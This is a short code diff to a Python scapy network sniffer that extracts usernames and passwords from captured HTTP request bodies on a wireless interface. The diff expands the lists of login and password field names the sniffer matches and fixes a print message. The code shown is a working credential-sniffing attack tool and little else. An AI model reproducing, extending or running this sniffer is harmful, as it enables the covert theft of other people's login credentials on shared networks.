@@ -13,8 +13,8 @@ def get_login_pass(body):
     user = None
     password = None
 
-    userfields = ["log", "login", "login_id", "username", "uname"]
-    passfields = ["pwd", "password", "pass"]
+    userfields = ["log", "login", "login_id", "username", "uname", "m_login_email", "email", "user", "usr"]
+    passfields = ["pwd", "password", "passwd", "passwrd", "pass", "m_login_password", "code", "passcode",]
 
     for login in userfields:
         login_re = re.search('(%s=[^&]+)' % login, body, re.IGNORECASE)
@@ -45,7 +45,7 @@ def packet_parser(packet):
 
 iface = "wlp3s0"
 try:
-    print("[*] Sniffing ... (press Ctrl+C to close")
+    print("[*] Sniffing ... (press Ctrl+C to close)")
     scapy.sniff(iface=iface, prn=packet_parser, store=0)
 
 except KeyboardInterrupt:
